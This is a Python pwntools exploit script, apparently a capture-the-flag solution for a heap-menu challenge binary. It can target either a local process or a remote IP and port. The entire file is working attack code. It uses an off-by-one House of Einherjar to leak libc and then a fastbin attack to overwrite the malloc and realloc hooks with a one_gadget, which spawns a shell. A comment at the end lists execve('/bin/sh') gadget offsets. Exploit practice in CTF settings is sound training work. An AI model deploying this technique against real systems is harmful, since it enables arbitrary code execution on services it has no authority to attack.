#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'

#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "timu"
libFile  = "/lib/x86_64-linux-gnu/libc.so.6"
#libFile  = './libc.so.6'

remoteIp = "159.138.137.79"
remotePort = 49417

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('Your choice :', str(1))
	sla('Size:', str(size))
	sa('Data:', data)

def rm(idx):
	sla('Your choice :', str(2))
	sla('Index:', str(idx))


def dp():
	sla('Your choice :', str(3))

#def q():
#	sla(':', str(5))	

#--------------------------Exploit--------------------------
def exploit():

	ad(0x100, 'A\n') # idx 0
	ad(0x100, 'B\n') # idx 1
	ad(0x68, 'C\n') # idx 2
	ad(0x68, 'D\n') # idx 3
	#creat fake chunk 
	p = '\x00' * (0xF0)
	p += p64(0x100) + p64(0x11) #fake chunk for passby unlink check
	ad(0x100, p)
	#db()
	#for fastbin
	rm(2)
	#for off by one to modify chunk 4
	rm(3)
	p = 'D' * 0x60
	p += p64(0x300) 
	ad(0x68, p)
	# trigger house of eiherjar
	# create main_arena + 88 for passby unlink check
	rm(0)

	rm(4)
	#split unsorted bin
	ad(0x100, 'A\n') #idx 0 then print will get main_arena in idx1
	dp()
	main_arena = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - 0x58
	libc_base = main_arena - 0x3c4b20
	fastbin_attack_addr = main_arena - 0x33
	one_gadget = libc_base + 0x4526a

	li('main_arena ' + hex(main_arena))
	li('libc_base  ' + hex(libc_base))
	li('one_gadget ' + hex(one_gadget))
	# fastbin attack
	p = '\x00' * 0x100
	p += p64(0)
	p += p64(0x71)
	p += p64(fastbin_attack_addr)
	p += '\n'
	ad(0x120, p)
	ad(0x68, '\n')
	# one gadget
	realloc_addr = libc_base + lib.sym['realloc']
	li('realloc_addr ' + hex(realloc_addr))
	p = '\x11' * (0x13 - 8)
	p += p64(one_gadget) # realloc_hook
	p += p64(realloc_addr + 2) # malloc_hook for banance stack
	p += '\n'
	ad(0x68, p)

	#get shell
	sl('1')
	sl('1')

	#db()

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
'''
